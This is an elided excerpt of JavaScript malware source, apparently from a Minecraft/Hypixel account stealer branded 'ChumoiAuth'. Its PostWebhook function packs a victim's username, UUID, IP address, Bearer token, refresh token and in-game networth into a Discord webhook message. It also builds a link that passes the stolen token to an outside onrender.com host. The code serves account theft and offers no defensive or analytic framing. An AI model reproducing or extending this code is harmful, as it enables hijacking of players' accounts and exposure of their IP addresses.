...
function PostWebhook(refresh, username, uuid, ip, BearerToken, refresh_token, networth, soulboundnetworth, description) {
    ...
    let data = {
        "username": "ChumoiAuth",
        "avatar_url": "https://cdn.discordapp.com/attachments/1072571949865250916/1091703052106465350/956255333905494118.png",
        "embeds": [
            {
            "title": "ChumoiAuth",
            ...
            footer: {
                    "text": "😱ChumoiAuth by Chumoi(Trover)😱",
                    "url": "https://cdn.discordapp.com/attachments/1072571949865250916/1091703052106465350/956255333905494118.png"
            },
            timestamp: new Date(),
            "fields": [
                {
                ...
                },
                {
                    ...
                    "value": "`Click [here]discord-hypixel.onrender.com/changeUsername?token="+BearerToken+"to change username!`",
                    "inline": false
                },
                {
                    "name": "Refresh Token",
